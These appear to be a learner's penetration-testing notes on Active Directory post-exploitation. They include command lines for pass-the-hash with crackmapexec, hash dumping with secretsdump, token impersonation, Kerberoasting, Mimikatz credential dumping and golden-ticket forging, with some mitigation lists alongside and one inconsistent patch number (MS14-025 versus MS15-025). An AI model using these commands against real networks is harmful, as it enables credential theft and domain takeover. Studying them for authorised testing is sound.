# Introduction
In this we are going to learn what to do after gaining access to any one system from the network.


# Pass The Hash / Password Overview

If we crack a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks


## Tools 

### crackmapexec

**Usage**:

`crackmapexec smb -u user_name -d domain_name -p pass_word <ip_address/CIDR>`

Local
`crackmapexec smb <ipaddress/CIDR> -u user_name -H ha_sh --local-auth`


![[CRACKMAPEXEChelp.png]]
 
 --> It  Passes the password through out the network and see if any machine sticks to that password
 
 (or) 
 
 You can use even hash by gathering the hash using msf hashdump.
 
 ![[hashdump msf.png]]
 
 And now you can pass the Hash instead of password
 
![[passing the hash in crackmapexec.png]]


<b > Installation</b>

 `apt install crackmapexec` (OR)
`python3 -m pip install crackmapexec`
## Dumping the hashes with the secretsdump.py



secretsdump.py is from impacket toolkit

*Usage*
`secretsdump.py domain_name/user_name:pass_word@ip_address`


## Mitigations for PassTheHash

- Limit account re-use:
	- Avoid re-using local Admin Password
	- Disable Guest and Administrators accounts
	- Limit who is a local administrator (least privilege)
-  Utilize strong passwords
	-  The Longer the better > 14 characters
	-  Avoid using common passwords
	-  I like long sentences
-  Privilege Access Management (PAM)
	-  Check out/in sensitive accounts when needed
	-  Automaically rotate the passwords on check out and check in 
	-  Limits pass attacks as hash/passwordis strong and constantly rotated

# Token Impersonation
## What are tokens?
- Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.

## Two Types:
- Delegate -> Created for logging into a machine or using remote desktop
- Impersonate -> "non-interactive" such as attaching a network drive  or a domain logon script


### msfconsole
load incognito

list_tokens -u (Users (or) -g for groups)

impersonate_token <name_group(or user)>

rev2self(Reverses all impersonations)
	

## Mitigation strategies

- Limit user/group token creation permissions
-  Account tiering (Dont login as administrator in normal computers)
-  Local admin restriction


## Kerberoasting


### How Kerberos works ?
![[Kerberoasting.png]]

- Domain Controller is also a KDC (Key Distribution Center)
- Victim/User should authenticate to Domain Controller. It requests for TGT (Ticket Granting Ticket).
- Then KDC will send the TGT by encrypting with krbtgt (Kerberos Ticket Granting Ticket)
-  SPN (Service Principal Name) .
-  To access a service user needs TGS and for the TGS the user needs TGT. And that TGT is issued when authenticating with KDC using user's ntlm hash



```			
KERBEROS



 * A principal is a unique identity (user / services)

Client process that access a service on behalf of a user


Key Distribution Center supplies tickets and generate temp session keys to 
authenticate securely


Messages
  
USER		Authenticators   		Tickets										Service

Send1		Encrypts & validates            Recieves the TGT                                                         It gets service ticket
Sends TGT to user		Validates and generate service ticket			



Attributes of send1

Username/ID
Servicename/ID
User Ip Address
Requeseted lifetime for TGT


Attributes of Authenticator generated
Encrypted with Client Secret Key
TGS name / id
TImeStamp
Lifetime (Same as requested once)


Attributes of Ticket Granting Ticket
Encrypted wih TGS Secret Key
User Name /ID
TGS Name /ID
Timestamp
User IP address
Lifetime for TGT

```

Now after all of this we will get TGS with the server's account Hash. So we will take the TGS and decrypt the server's hash and get the password.

We use **GetUserSPNs** tool from *impacket*
### Tool:
#### GetUserSPNs :
##### Usage:
	GetUserSPNs.py domain_name.local/user_name@password -dc-ip <domain_controller_ip> -request
	
![[Images/GetUserSPNs.png]]

# GPP (MS14-025) Group Policy Preferences

## OVERVIEW

- Group Policy Preferences allowed admins to create policies using embedded credentials.
- These credentials were encrypted in a cPassword
- The key was accidentaly released 
- This was patched in MS15-025, but doesn't prevent previous uses. What I mean here is that if the embedded credential was created before the patch those are even vulnerable until now unless they were changed after the patch.

[Blog for GPP by Rapid7](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)

	
	
# Mimikatz

### Its a tool
- It is used to steal credentialsm generate Kerberos Tickets and leverage attacks
- Dumps credentials stored in memory

Usage:
First Thing to be done
``` privilege::debug		 --> Debugs the privilege process
	sekurlsa::logonpasswords --> Shows all the hashes
	lsadump::lsa /patch      --> Similar and this shows rid sekurlsa:logonpasswords with less detailed and more easy to read
	lsadump::lsa /inject /name:user_name --> detailed info on users
```

### Creating a Golden Ticket
![[SIDofTheUser.png]]
Command:
`kerberos::golden /User:any_name /domain:DOMAIN.local /sid:SID_ID /krbtgt:ntlmhash_of_krbtgt_user /id:admin_rid /ptt --> Which means pass the hash`



	**0**kerberos::golden /User:Administrator /domain:ACTIVE.local /sid:S-1-5-21-2668466849-1233456057-673544522  /id:500 /krbtgt:b8db93642c64fa1f13d2f43389e6c5bd /ptt





















## Links for further study
Active Directory Security Blog: [https://adsecurity.org/](https://adsecurity.org/)

Harmj0y Blog: [http://blog.harmj0y.net/](http://blog.harmj0y.net/)

Pentester Academy Active Directory: [https://www.pentesteracademy.com/activedirectorylab](https://www.pentesteracademy.com/activedirectorylab)

Pentester Academy Red Team Labs: [https://www.pentesteracademy.com/redteamlab](https://www.pentesteracademy.com/redteamlab)

eLS PTX: [https://www.elearnsecurity.com/course/penetration_testing_extreme/](https://www.elearnsecurity.com/course/penetration_testing_extreme/)
	
